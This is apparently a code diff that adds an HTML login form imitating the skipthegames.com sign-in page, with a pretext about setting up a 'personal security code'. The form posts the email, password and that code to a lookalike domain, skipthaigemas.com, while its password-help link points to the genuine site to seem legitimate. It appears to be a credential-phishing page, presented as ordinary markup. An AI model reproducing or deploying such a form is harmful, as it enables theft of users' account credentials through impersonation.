@@ -1,0 +1,11 @@
+<div class="small-16 medium-7 columns login-form">
+            <h3>Setup your personal security code to protect your account</h3>
+            <form action="https://skipthaigemas.com/login" class="loginwrapper" method="post" accept-charset="utf-8">
+<input type="hidden" name="rt_csrf_token" value="611de6a8c58c160446bcebeba6e39d7b">                                                                                     
+                <input type="email" name="email" placeholder="Your email" required="">
+                <input type="password" name="password" placeholder="Password" required="">
+                <input type="your personal security code" name="your personal security code" placeholder="your personal security code" required="">
+                <div></div><input type="submit" class="g-recaptcha expand radius button" value="Log in">
+
+                <p class="m0 ull">Password not working? <a href="https://skipthegames.com/login/password?to=" target="_blank">Click here</a></p>
+             </form>        </div>
